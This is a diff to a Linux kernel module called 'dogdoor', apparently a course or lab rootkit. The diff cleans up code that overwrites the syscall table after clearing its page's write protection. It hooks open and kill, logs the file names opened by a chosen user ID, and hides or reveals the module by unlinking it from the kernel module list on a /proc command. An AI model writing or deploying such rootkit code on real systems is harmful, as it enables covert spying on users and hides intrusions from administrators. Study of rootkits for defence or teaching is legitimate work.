@@ -13,36 +13,36 @@
 
 MODULE_LICENSE("GPL");
 
-int userid = 1001;
 void ** sctable;
-int count = 0;
-kuid_t target_uid;
-int target_id;
-pid_t target_pid;
+bool hidden = false;
+
 char fname_list[10][256];
+char message[256];
+
+kuid_t target_uid;
+pid_t target_pid;
+
+int userid = 1001;
+int count = 0;
+int target_id;
 int fname_count = 0;
 int prog_num = 0;
-char message[256];
+
 struct list_head this;
 struct list_head *list_temp;
 struct list_head *prev;
 struct list_head *next;
-bool hidden = false;
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode);
 asmlinkage long (*orig_sys_kill)(pid_t pid, int sig);
-asmlinkage long (*orig_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode) {
 	char fname[256];
 	int i;
 
-	//printk("----------read by %d-----------", current->cred->uid);
 	copy_from_user(fname, filename, 256);
 
 	if (prog_num == 1 && uid_eq(current->cred->uid, target_uid)) {
-		//count++;
-		//return -1;
 		if (fname_count < 10) {
 			strcpy(fname_list[fname_count], fname);
 			fname_count += 1;
@@ -52,13 +52,7 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 			}
 			strcpy(fname_list[9], fname);
 		}
-		printk("******************************************************************");
-		for (i = 0; i < fname_count; i++){
-			printk("%d, %s", current->cred->uid, fname_list[i]);
-		}
-		printk("******************************************************************");
 	}
-
 
 	return orig_sys_open(filename, flags, mode);
 }
@@ -77,10 +71,6 @@ asmlinkage long dogdoor_sys_kill(pid_t pid, int sig){
 	}
 
 	return orig_sys_kill(pid, sig);
-}
-
-asmlinkage long dogdoor_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
-	return orig_sys_getdents(fd, dirent, count);
 }
 
 static int dogdoor_proc_open(struct inode *inode, struct file *file) {
@@ -116,9 +106,7 @@ static ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, si
 	if (copy_from_user(buf, ubuf, size))
 		return -EFAULT;
 	
-	//sscanf(buf, "%d", &userid);
 	target_uid.val = userid;
-	//sscanf(buf, "%d", &target_id);
 	sscanf(buf, "%d %s %d", &prog_num, message, &target_id);
 	printk("%d, %s, %d", prog_num, message, target_id);
 	
@@ -130,15 +118,11 @@ static ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, si
 	}
 	else if (prog_num == 3) {
 		if (hidden) {
-			//__list_add(&this, prev, next);
-			//if (__list_add_valid(&this, prev, next)){
 			next->prev = list_temp;
 			prev->next = list_temp;
 			printk("******* Not Hidden!! *******");
 			hidden = false;
-			//}
 		} else {
-			//__list_del(prev, next);
 			next->prev = prev;
 			prev->next = next;
 			printk("******* Hidden!!! ********");
@@ -171,21 +155,16 @@ static int __init dogdoor_init(void) {
 
 	orig_sys_open = sctable[__NR_open];
 	orig_sys_kill = sctable[__NR_kill];
-	//orig_sys_getdents = sctable[__NR_getdents];
 	pte = lookup_address((unsigned long) sctable, &level);
 	if (pte->pte &~ _PAGE_RW)
 		pte->pte |= _PAGE_RW;
 	sctable[__NR_open] = dogdoor_sys_open;
 	sctable[__NR_kill] = dogdoor_sys_kill;
-	//sctable[__NR_getdents] = dogdoor_sys_getdents;
 
-	//target_uid.val = 1001;
 	this = THIS_MODULE->list;
 	next = (&this)->next;
 	prev = (&this)->prev;
 	list_temp = next->prev;
-	printk("%x, %x, %x", &this, next, prev);
-	printk("%x, %x, %x", list_temp, next->prev, prev->next);
 
 	return 0;
 }
@@ -197,7 +176,6 @@ static void __exit dogdoor_exit(void) {
 
 	sctable[__NR_open] = orig_sys_open;
 	sctable[__NR_kill] = orig_sys_kill;
-	sctable[__NR_getdents] = orig_sys_getdents;
 	pte = lookup_address((unsigned long) sctable, &level);
 	pte->pte = pte->pte &~ _PAGE_RW;
 }
